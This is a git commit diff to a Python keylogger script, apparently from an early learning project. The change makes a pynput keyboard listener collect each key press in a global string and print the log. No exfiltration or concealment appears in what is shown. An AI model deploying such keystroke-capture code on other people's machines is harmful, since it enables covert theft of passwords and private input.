f3c03c9fcf309453c10a0a0214b72ee738c8cc95
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-05-02 17:05:33 +0530

    Storing keylogs in global variable

--- keylogger.py
+++ keylogger.py
@@ -2,8 +2,12 @@
 
 import pynput.keyboard  # allows us to monitor mouse and keyboard
 
+log = ""
+
 def process_key_press(key):
-    print(key)
+    global log
+    log = log + str(key)
+    print(log)
 
 keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
 with keyboard_listener:
